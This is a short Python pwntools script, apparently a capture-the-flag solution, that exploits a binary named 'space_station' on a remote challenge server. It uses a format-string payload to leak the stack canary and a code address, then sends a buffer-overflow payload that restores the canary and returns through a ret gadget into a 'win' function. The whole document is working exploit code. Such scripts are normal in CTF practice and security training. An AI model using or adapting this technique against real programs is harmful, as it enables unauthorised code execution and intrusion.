from pwn import *

context.binary=elf=ELF("./space_station")

p=process(elf.path)
p=remote("offsec.m0lecon.it",13505)
p.recv()
payload=b"%15$p%25$p"
offset=64+8
p.sendline(payload)
canary=int(p.recv(18),16)
main=int(p.recv(14),16)
print(hex(main))
print(hex(canary))

print(p.recv())
offset_main=main-elf.sym.main
win_addr=elf.sym.win+offset_main
ret=ROP(elf).find_gadget(["ret"])[0]+offset_main
payload2=flat(
    b'a'*offset,
    p64(canary),
    b'a'*8,
    p64(ret),
    p64(win_addr)
)
p.sendline(payload2)

p.interactive()